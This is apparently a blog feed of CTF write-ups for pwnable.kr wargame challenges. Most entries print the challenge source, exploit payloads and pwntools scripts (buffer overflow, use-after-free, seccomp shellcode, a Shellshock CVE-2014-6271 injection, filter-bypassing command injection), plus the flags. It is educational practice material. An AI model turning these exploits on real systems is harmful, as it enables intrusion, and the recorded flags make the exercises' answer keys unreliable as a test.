i&lt;6; i++)&#123;    lotto[i] = (lotto[i] % 45) + 1;   // 1 ~ 45  &#125;  close(fd);  // calculate lotto score  int match = 0, j = 0;  for(i=0; i&lt;6; i++)&#123;    for(j=0; j&lt;6; j++)&#123;      if(lotto[i] == submit[j])&#123;        match++;      &#125;    &#125;  &#125;  // win!  if(match == 6)&#123;    system(&quot;/bin/cat flag&quot;);  &#125;  else&#123;    printf(&quot;bad luck...\n&quot;);  &#125;&#125;void help()&#123;  printf(&quot;- nLotto Rule -\n&quot;);  printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;);  printf(&quot;your goal is to match lotto numbers as many as you can\n&quot;);  printf(&quot;if you win lottery for *1st place*, you will get reward\n&quot;);  printf(&quot;for more details, follow the link below\n&quot;);  printf(&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;);  printf(&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;);&#125;int main(int argc, char* argv[])&#123;  // menu  unsigned int menu;  while(1)&#123;    printf(&quot;- Select Menu -\n&quot;);    printf(&quot;1. Play Lotto\n&quot;);    printf(&quot;2. Help\n&quot;);    printf(&quot;3. Exit\n&quot;);    scanf(&quot;%d&quot;, &amp;menu);    switch(menu)&#123;      case 1:        play();        break;      case 2:        help();        break;      case 3:        printf(&quot;bye\n&quot;);        return 0;      default:        printf(&quot;invalid menu\n&quot;);        break;    &#125;  &#125;  return 0;&#125;</code></pre><h2 id="solve-4"><a href="#solve-4" class="headerlink" title="solve"></a>solve</h2><pre><code class="python">from pwn import *#context.log_level=&#39;debug&#39;s = ssh(&quot;lotto&quot;, &quot;pwnable.kr&quot;, port=2222, password=&quot;guest&quot;)r = s.process(&quot;./lotto&quot;)for i in range(50):  r.recvuntil(&#39;3. Exit\n&#39;)  r.sendline(&#39;1&#39;)  r.recvuntil(&#39;Submit your 6 lotto bytes :&#39;)  r.sendline(&#39;!&#39;*6)</code></pre><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">sorry mom... I FORGOT to check duplicate numbers... :(</code></pre><p>[Toddler’s Bottle] is over!!!<br>I have been very busy for a long time in the past.<br>But now Toddler’s Bottle is over~<br>GO GO GO!</p>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr_2</title>
      <link href="/2018/07/27/pwnable-kr-2/"/>
      <url>/2018/07/27/pwnable-kr-2/</url>
      
        <content type="html"><![CDATA[<h1 id="13-uaf"><a href="#13-uaf" class="headerlink" title="13.uaf"></a>13.uaf</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><span id="more"></span><pre><code class="cpp">#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private:  virtual void give_shell()&#123;    system(&quot;/bin/sh&quot;);  &#125;protected:  int age;  string name;public:  virtual void introduce()&#123;    cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;    cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;  &#125;&#125;;class Man: public Human&#123;public:  Man(string name, int age)&#123;    this-&gt;name = name;    this-&gt;age = age;        &#125;        virtual void introduce()&#123;    Human::introduce();                cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;        &#125;&#125;;class Woman: public Human&#123;public:        Woman(string name, int age)&#123;                this-&gt;name = name;                this-&gt;age = age;        &#125;        virtual void introduce()&#123;                Human::introduce();                cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;        &#125;&#125;;int main(int argc, char* argv[])&#123;  Human* m = new Man(&quot;Jack&quot;, 25);  Human* w = new Woman(&quot;Jill&quot;, 21);  size_t len;  char* data;  unsigned int op;  while(1)&#123;    cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;    cin &gt;&gt; op;    switch(op)&#123;      case 1:        m-&gt;introduce();        w-&gt;introduce();        break;      case 2:        len = atoi(argv[1]);        data = new char[len];        read(open(argv[2], O_RDONLY), data, len);        cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;        break;      case 3:        delete m;        delete w;        break;      default:        break;    &#125;  &#125;  return 0;&#125;</code></pre><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">python -c &quot;print &#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;&quot; &gt;/tmp/poc./uaf 24 /tmp/poc1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1$ lsflag  uaf  uaf.cpp$ cat flagyay_f1ag_aft3r_pwning</code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">yay_f1ag_aft3r_pwning</code></pre><h1 id="14-memcpy"><a href="#14-memcpy" class="headerlink" title="14.memcpy"></a>14.memcpy</h1><h2 id="question-1"><a href="#question-1" class="headerlink" title="question"></a>question</h2><pre><code class="c">// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123;        asm(&quot;rdtsc&quot;);&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123;  int i;  for (i=0; i&lt;len; i++) &#123;    dest[i] = src[i];  &#125;  return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123;  size_t i;  // 64-byte block fast copy  if(len &gt;= 64)&#123;    i = len / 64;    len &amp;= (64-1);    while(i-- &gt; 0)&#123;      __asm__ __volatile__ (      &quot;movdqa (%0), %%xmm0\n&quot;      &quot;movdqa 16(%0), %%xmm1\n&quot;      &quot;movdqa 32(%0), %%xmm2\n&quot;      &quot;movdqa 48(%0), %%xmm3\n&quot;      &quot;movntps %%xmm0, (%1)\n&quot;      &quot;movntps %%xmm1, 16(%1)\n&quot;      &quot;movntps %%xmm2, 32(%1)\n&quot;      &quot;movntps %%xmm3, 48(%1)\n&quot;      ::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;);      dest += 64;      src += 64;    &#125;  &#125;  // byte-to-byte slow copy  if(len) slow_memcpy(dest, src, len);  return dest;&#125;int main(void)&#123;  setvbuf(stdout, 0, _IONBF, 0);  setvbuf(stdin, 0, _IOLBF, 0);  printf(&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;);  printf(&quot;The assignment is simple.\n&quot;);  printf(&quot;-----------------------------------------------------\n&quot;);  printf(&quot;- What is the best implementation of memcpy?        -\n&quot;);  printf(&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;);  printf(&quot;- 2. compare them with various size of data         -\n&quot;);  printf(&quot;- 3. conclude your experiment and submit report     -\n&quot;);  printf(&quot;-----------------------------------------------------\n&quot;);  printf(&quot;This time, just help me out with my experiment and get flag\n&quot;);  printf(&quot;No fancy hacking, I promise :D\n&quot;);  unsigned long long t1, t2;  int e;  char* src;  char* dest;  unsigned int low, high;  unsigned int size;  // allocate memory  char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);  char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);  src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);  size_t sizes[10];  int i=0;  // setup experiment parameters  for(e=4; e&lt;14; e++)&#123;  // 2^13 = 8K    low = pow(2,e-1);    high = pow(2,e);    printf(&quot;specify the memcpy amount between %d ~ %d : &quot;, low, high);    scanf(&quot;%d&quot;, &amp;size);    if( size &lt; low || size &gt; high )&#123;      printf(&quot;don&#39;t mess with the experiment.\n&quot;);      exit(0);    &#125;    sizes[i++] = size;  &#125;  sleep(1);  printf(&quot;ok, lets run the experiment with your configuration\n&quot;);  sleep(1);  // run experiment  for(i=0; i&lt;10; i++)&#123;    size = sizes[i];    printf(&quot;experiment %d : memcpy with buffer size %d\n&quot;, i+1, size);    dest = malloc( size );    memcpy(cache1, cache2, 0x4000);   // to eliminate cache effect    t1 = rdtsc();    slow_memcpy(dest, src, size);   // byte-to-byte memcpy    t2 = rdtsc();    printf(&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;, t2-t1);    memcpy(cache1, cache2, 0x4000);   // to eliminate cache effect    t1 = rdtsc();    fast_memcpy(dest, src, size);   // block-to-block memcpy    t2 = rdtsc();    printf(&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;, t2-t1);    printf(&quot;\n&quot;);  &#125;  printf(&quot;thanks for helping my experiment!\n&quot;);  printf(&quot;flag : ----- erased in this source code -----\n&quot;);  return 0;&#125;</code></pre><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">memcpy@ubuntu:~$ nc 0 9022Hey, I have a boring assignment for CS class.. :(The assignment is simple.------------------------------------------------------ What is the best implementation of memcpy?        -- 1. implement your own slow/fast version of memcpy -- 2. compare them with various size of data         -- 3. conclude your experiment and submit report     ------------------------------------------------------This time, just help me out with my experiment and get flagNo fancy hacking, I promise :Dspecify the memcpy amount between 8 ~ 16 : 12specify the memcpy amount between 16 ~ 32 : 28specify the memcpy amount between 32 ~ 64 : 60specify the memcpy amount between 64 ~ 128 : 124specify the memcpy amount between 128 ~ 256 : 252specify the memcpy amount between 256 ~ 512 : 508specify the memcpy amount between 512 ~ 1024 : 1020specify the memcpy amount between 1024 ~ 2048 : 2044specify the memcpy amount between 2048 ~ 4096 : 4092specify the memcpy amount between 4096 ~ 8192 : 8188ok, lets run the experiment with your configurationexperiment 1 : memcpy with buffer size 12ellapsed CPU cycles for slow_memcpy : 1662ellapsed CPU cycles for fast_memcpy : 435experiment 2 : memcpy with buffer size 28ellapsed CPU cycles for slow_memcpy : 453ellapsed CPU cycles for fast_memcpy : 498experiment 3 : memcpy with buffer size 60ellapsed CPU cycles for slow_memcpy : 882ellapsed CPU cycles for fast_memcpy : 924experiment 4 : memcpy with buffer size 124ellapsed CPU cycles for slow_memcpy : 1731ellapsed CPU cycles for fast_memcpy : 945experiment 5 : memcpy with buffer size 252ellapsed CPU cycles for slow_memcpy : 3453ellapsed CPU cycles for fast_memcpy : 1029experiment 6 : memcpy with buffer size 508ellapsed CPU cycles for slow_memcpy : 7287ellapsed CPU cycles for fast_memcpy : 1029experiment 7 : memcpy with buffer size 1020ellapsed CPU cycles for slow_memcpy : 13728ellapsed CPU cycles for fast_memcpy : 1131experiment 8 : memcpy with buffer size 2044ellapsed CPU cycles for slow_memcpy : 27411ellapsed CPU cycles for fast_memcpy : 1512experiment 9 : memcpy with buffer size 4092ellapsed CPU cycles for slow_memcpy : 57345ellapsed CPU cycles for fast_memcpy : 2376experiment 10 : memcpy with buffer size 8188ellapsed CPU cycles for slow_memcpy : 121659ellapsed CPU cycles for fast_memcpy : 3969thanks for helping my experiment!flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</code></pre><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</code></pre><h1 id="15-asm"><a href="#15-asm" class="headerlink" title="15.asm"></a>15.asm</h1><h2 id="question-2"><a href="#question-2" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox()&#123;  scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);  if (ctx == NULL) &#123;    printf(&quot;seccomp error\n&quot;);    exit(0);  &#125;  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);  if (seccomp_load(ctx) &lt; 0)&#123;    seccomp_release(ctx);    printf(&quot;seccomp error\n&quot;);    exit(0);  &#125;  seccomp_release(ctx);&#125;char stub[] = &quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;;unsigned char filter[256];int main(int argc, char* argv[])&#123;  setvbuf(stdout, 0, _IONBF, 0);  setvbuf(stdin, 0, _IOLBF, 0);  printf(&quot;Welcome to shellcoding practice challenge.\n&quot;);  printf(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n&quot;);  printf(&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n&quot;);  printf(&quot;If this does not challenge you. you should play &#39;asg&#39; challenge :)\n&quot;);  char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);  memset(sh, 0x90, 0x1000);  memcpy(sh, stub, strlen(stub));  int offset = sizeof(stub);  printf(&quot;give me your x64 shellcode: &quot;);  read(0, sh+offset, 1000);  alarm(10);  chroot(&quot;/home/asm_pwn&quot;);  // you are in chroot jail. so you can&#39;t use symlink in /tmp  sandbox();  ((void (*)(void))sh)();  return 0;&#125;</code></pre><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><p>first open the file ,than read,from rax to rsp from 100B,print the context from rsp.</p><pre><code class="python">#!/user/bin/pythonfrom pwn import * con = ssh(host=&#39;pwnable.kr&#39;, user=&#39;asm&#39;, password=&#39;guest&#39;, port=2222)p = con.connect_remote(&#39;localhost&#39;, 9026)context(arch=&#39;amd64&#39;, os=&#39;linux&#39;) shellcode = &quot;&quot;shellcode += shellcraft.open(&#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;)shellcode += shellcraft.read(&#39;rax&#39;, &#39;rsp&#39;, 1000)shellcode += shellcraft.write(1, &#39;rsp&#39;, 1000) #print shellcode print p.recv() p.send(asm(shellcode)) print p.recvline()</code></pre><h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">Mak1ng_shelLcodE_i5_veRy_eaSy</code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr_1</title>
      <link href="/2018/07/27/pwnable-kr-1/"/>
      <url>/2018/07/27/pwnable-kr-1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-fd"><a href="#1-fd" class="headerlink" title="1.[fd]"></a>1.[fd]</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>ssh the server.and see three files.fd,fd.c,flag.</p><span id="more"></span><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123;  if(argc&lt;2)&#123;    printf(&quot;pass argv[1] a number\n&quot;);    return 0;  &#125;  int fd = atoi( argv[1] ) - 0x1234;  int len = 0;  len = read(fd, buf, 32);  if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;    printf(&quot;good job :)\n&quot;);    system(&quot;/bin/cat flag&quot;);    exit(0);  &#125;  printf(&quot;learn about Linux file IO\n&quot;);  return 0;&#125;</code></pre><p>it’s say how to make function read to work.<br>it’s two func,atoi and read.</p><p>0x1235&#x3D;4661</p><pre><code class="bash">./fd 4661LETMEWIN\n</code></pre><p>flag</p><pre><code>mommy! I think I know what a file descriptor is!!</code></pre><h1 id="2-collision"><a href="#2-collision" class="headerlink" title="2.collision"></a>2.collision</h1><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><pre><code class="python">from pwn import *k=p32(h-0x01010101*4)+p32(0x01010101)*4p=process([&#39;./col&#39;,k])p.interactive()</code></pre><p>flag</p><pre><code>daddy! I just managed to create a hash collision :)</code></pre><h1 id="3-bof"><a href="#3-bof" class="headerlink" title="3.bof"></a>3.bof</h1><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><p>overflow</p><pre><code class="python"># encoding=utf-8from pwn import *ip=&#39;pwnable.kr&#39;port=9000p=remote(ip,port)payload=&#39;A&#39;*(0x2c+0x8)+p32(0xcafebabe)p.sendline(payload)p.interactive()</code></pre><h1 id="4-flag"><a href="#4-flag" class="headerlink" title="4.flag"></a>4.flag</h1><p>re</p><h2 id="solve-3"><a href="#solve-3" class="headerlink" title="solve"></a>solve</h2><pre><code>UPX...? sounds like a delivery service :)</code></pre><h1 id="5-passcode"><a href="#5-passcode" class="headerlink" title="5.passcode"></a>5.passcode</h1><p>use name to change the address of printf to system.</p><pre><code class="python">payload = &#39;A&#39;*96+&#39;\x00\xa0\x04\x08&#39;+&#39;\n&#39;+str(int(0x80485e3))+&#39;\n&#39;</code></pre><p>flag</p><pre><code>Sorry mom.. I got confused about scanf usage :(</code></pre><h1 id="6-random"><a href="#6-random" class="headerlink" title="6.random"></a>6.random</h1><p>not real random ,it always 1804289383.</p><h2 id="solve-4"><a href="#solve-4" class="headerlink" title="solve"></a>solve</h2><pre><code>3039230856</code></pre><p>flag</p><pre><code>Mommy, I thought libc random is unpredictable...</code></pre><h1 id="7-input"><a href="#7-input" class="headerlink" title="7.input"></a>7.input</h1><h2 id="sourcecode"><a href="#sourcecode" class="headerlink" title="sourcecode"></a>sourcecode</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123;  printf(&quot;Welcome to pwnable.kr\n&quot;);  printf(&quot;Let&#39;s see if you know how to give input to program\n&quot;);  printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;);  // argv  if(argc != 100) return 0;  if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0;  if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0;  printf(&quot;Stage 1 clear!\n&quot;);  // stdio  char buf[4];  read(0, buf, 4);  if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;  read(2, buf, 4);        if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;  printf(&quot;Stage 2 clear!\n&quot;);  // env  if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;  printf(&quot;Stage 3 clear!\n&quot;);  // file  FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);  if(!fp) return 0;  if( fread(buf, 4, 1, fp)!=1 ) return 0;  if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;  fclose(fp);  printf(&quot;Stage 4 clear!\n&quot;);  // network  int sd, cd;  struct sockaddr_in saddr, caddr;  sd = socket(AF_INET, SOCK_STREAM, 0);  if(sd == -1)&#123;    printf(&quot;socket error, tell admin\n&quot;);    return 0;  &#125;  saddr.sin_family = AF_INET;  saddr.sin_addr.s_addr = INADDR_ANY;  saddr.sin_port = htons( atoi(argv[&#39;C&#39;]) );  if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;    printf(&quot;bind error, use another port\n&quot;);        return 1;  &#125;  listen(sd, 1);  int c = sizeof(struct sockaddr_in);  cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);  if(cd &lt; 0)&#123;    printf(&quot;accept error, tell admin\n&quot;);    return 0;  &#125;  if( recv(cd, buf, 4, 0) != 4 ) return 0;  if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;  printf(&quot;Stage 5 clear!\n&quot;);  // here&#39;s your flag  system(&quot;/bin/cat flag&quot;);  return 0;&#125;</code></pre><h2 id="solve-5"><a href="#solve-5" class="headerlink" title="solve"></a>solve</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt; #include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;netinet/in.h&gt;int main()&#123;    /* stage 1 */    char *argv[101] = &#123;0&#125;;    for(int i = 1; i&lt;100; ++i)        argv[i] = &quot;a&quot;;    argv[0] = &quot;/home/input2/input&quot;;    argv[&#39;A&#39;] = &quot;\x00&quot;;    argv[&#39;B&#39;] = &quot;\x20\x0a\x0d&quot;;    argv[&#39;C&#39;] = &quot;9999&quot;; //server port    argv[100] = NULL;    /* stage 3 */    char *envp[2] = &#123;&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;, NULL&#125;;    /* stage 4 */  // ! : file open before execve , or the check will fail     FILE *fp = fopen(&quot;\x0a&quot;, &quot;wb&quot;); // wb,w are similar in linux but differ in win    if(!fp)                         //see \x0d\x0a in win and \x0a in linux    &#123;        perror(&quot;Cannot open file.&quot;);        exit(1);    &#125;    printf(&quot;open file success.\n&quot;);    fwrite(&quot;\x00\x00\x00\x00&quot;, 4, 1, fp);    fclose(fp);        /* stage 2 */    int pipe_stdin[2] = &#123;-1, -1&#125;;    int pipe_stderr[2] = &#123;-1, -1&#125;;    pid_t pid_child;    if ( pipe(pipe_stdin) &lt; 0 || pipe(pipe_stderr) &lt; 0 )    &#123;        perror(&quot;Cannot create the pipe.&quot;);        exit(1);    &#125;    #define STDIN_READ   pipe_stdin[0]    #define STDIN_WRITE  pipe_stdin[1]    #define STDERR_READ  pipe_stderr[0]    #define STDERR_WRITE pipe_stderr[1]    if ( ( pid_child = fork() ) &lt; 0 )   // do not forget the ()!    &#123;        perror(&quot;Cannot create fork child.&quot;);        exit(1);    &#125;    if( pid_child == 0 )    &#123;        /*child proc*/        sleep(1); //wait to pipe link 0,2        close(STDIN_READ);        close(STDERR_READ);        write(STDIN_WRITE, &quot;\x00\x0a\x00\xff&quot;, 4);        write(STDERR_WRITE, &quot;\x00\x0a\x02\xff&quot;, 4);    &#125;    else    &#123;        /*parent proc*/        close(STDIN_WRITE);        close(STDERR_WRITE);        dup2(STDIN_READ, 0);  //dup to 0-stdin        dup2(STDERR_READ, 2); //dup to 2-stderr        printf(&quot;start execve input.\n&quot;);        execve(&quot;/home/input2/input&quot;, argv, envp);            perror(&quot;Fail to execute the program&quot;);            exit(1);    &#125;    printf(&quot;pipe link.\n&quot;);    /* stage 5 */    sleep(2); // wait the server start    int sockfd;    char buf[10] = &#123;0&#125;; // buf to be sent    int len;            // len of avail buf    struct sockaddr_in servaddr;    servaddr.sin_family = AF_INET;      servaddr.sin_port = htons(9999);  // port in argv[&#39;C&#39;]     servaddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); //local    if( (sockfd = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0 )      &#123;          perror(&quot;socket error.&quot;);          exit(1);      &#125;      if ( connect(sockfd, (struct sockaddr*) &amp;servaddr, sizeof(servaddr)) &lt; 0 )    &#123;        perror(&quot;connect error.&quot;);        exit(1);        &#125;    printf(&quot;socket connect.\n&quot;);    strcpy(buf, &quot;\xde\xad\xbe\xef&quot;);    len = strlen(buf);    send(sockfd, buf, len, 0);    close(sockfd);      return 0;&#125;</code></pre><pre><code>ln -s /home/input2/flag flaggcc 1.c -g./a.out</code></pre><p>flag</p><pre><code>Mommy! I learned how to pass various input in Linux :)</code></pre><h1 id="8-leg"><a href="#8-leg" class="headerlink" title="8.leg"></a>8.leg</h1><h2 id="solve-6"><a href="#solve-6" class="headerlink" title="solve"></a>solve</h2><pre><code>key1=0x8cdc+8key2=0x8d04+4key3=0x8d80</code></pre><p>flag</p><pre><code>My daddy has a lot of ARMv5te muscle!</code></pre><h1 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9.mistake"></a>9.mistake</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123;  int i;  for(i=0; i&lt;len; i++)&#123;    s[i] ^= XORKEY;  &#125;&#125;int main(int argc, char* argv[])&#123;  int fd;  if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;    printf(&quot;can&#39;t open password %d\n&quot;, fd);    return 0;  &#125;  printf(&quot;do not bruteforce...\n&quot;);  sleep(time(0)%20);  char pw_buf[PW_LEN+1];  int len;  if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;    printf(&quot;read error\n&quot;);    close(fd);    return 0;  &#125;  char pw_buf2[PW_LEN+1];  printf(&quot;input password : &quot;);  scanf(&quot;%10s&quot;, pw_buf2);  // xor your input  xor(pw_buf2, 10);  if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;    printf(&quot;Password OK\n&quot;);    system(&quot;/bin/cat flag\n&quot;);  &#125;  else&#123;    printf(&quot;Wrong Password\n&quot;);  &#125;  close(fd);  return 0;&#125;</code></pre><h2 id="solve-7"><a href="#solve-7" class="headerlink" title="solve"></a>solve</h2><p>open &gt;&#x3D; 0.so fd&#x3D;if(0 &lt; open) &#x3D; 0;</p><p>payload</p><pre><code>00000000001111111111</code></pre><p>flag</p><pre><code>Mommy, the operator priority always confuses me :(</code></pre><h1 id="10-shellshock"><a href="#10-shellshock" class="headerlink" title="10.shellshock"></a>10.shellshock</h1><p>CVE-2014-6271</p><h2 id="solve-8"><a href="#solve-8" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">env x=&#39;() &#123; :;&#125;; /bin/cat flag&#39; ./shellshock</code></pre><p>flag</p><pre><code>only if I knew CVE-2014-6271 ten years ago..!!</code></pre><h1 id="11-cmd1"><a href="#11-cmd1" class="headerlink" title="11.cmd1"></a>11.cmd1</h1><h2 id="question-1"><a href="#question-1" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123;  int r=0;  r += strstr(cmd, &quot;flag&quot;)!=0;  r += strstr(cmd, &quot;sh&quot;)!=0;  r += strstr(cmd, &quot;tmp&quot;)!=0;  return r;&#125;int main(int argc, char* argv[], char** envp)&#123;  putenv(&quot;PATH=/thankyouverymuch&quot;);  if(filter(argv[1])) return 0;  system( argv[1] );  return 0;&#125;</code></pre><h2 id="solve-9"><a href="#solve-9" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">./cmd1 &quot;/bin/cat /home/cmd1/fl*&quot;</code></pre><p>flag</p><pre><code>mommy now I get what PATH environment is for :)</code></pre><h1 id="12-cmd2"><a href="#12-cmd2" class="headerlink" title="12.cmd2"></a>12.cmd2</h1><h2 id="question-2"><a href="#question-2" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123;  int r=0;  r += strstr(cmd, &quot;=&quot;)!=0;  r += strstr(cmd, &quot;PATH&quot;)!=0;  r += strstr(cmd, &quot;export&quot;)!=0;  r += strstr(cmd, &quot;/&quot;)!=0;  r += strstr(cmd, &quot;`&quot;)!=0;  r += strstr(cmd, &quot;flag&quot;)!=0;  return r;&#125;extern char** environ;void delete_env()&#123;  char** p;  for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123;  delete_env();  putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;);  if(filter(argv[1])) return 0;  printf(&quot;%s\n&quot;, argv[1]);  system( argv[1] );  return 0;&#125;</code></pre><h2 id="solve-10"><a href="#solve-10" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">cd /tmpmkdir xyzzpwncd xyzzpwnecho &quot;/bin/cat /home/cmd2/flag&quot; &gt;xyzzchmod +x xyzzcd //home/cmd2/cmd2 &#39;$(pwd)tmp$(pwd)xyzzpwn$(pwd)xyzz&#39;</code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code>FuN_w1th_5h3ll_v4riabl3s_haha</code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>static web</title>
      <link href="/2018/06/23/static-web/"/>
      <url>/2018/06/23/static-web/</url>
      
        <content type="html"><![CDATA[<p>Because my teacher tell me to build a static web server for defend the attack.<br>I think i should do this things:</p><blockquote><p>it can defend attack. The best is nginx to show the static web file.<br>High concurrency—&gt;nginx<br>auto update -&gt; del the file for times and create new<br>can easy deploy -&gt; docker</p></blockquote><!-- more  -->]]></content>
      
      
      <categories>
          
          <category> web </category>
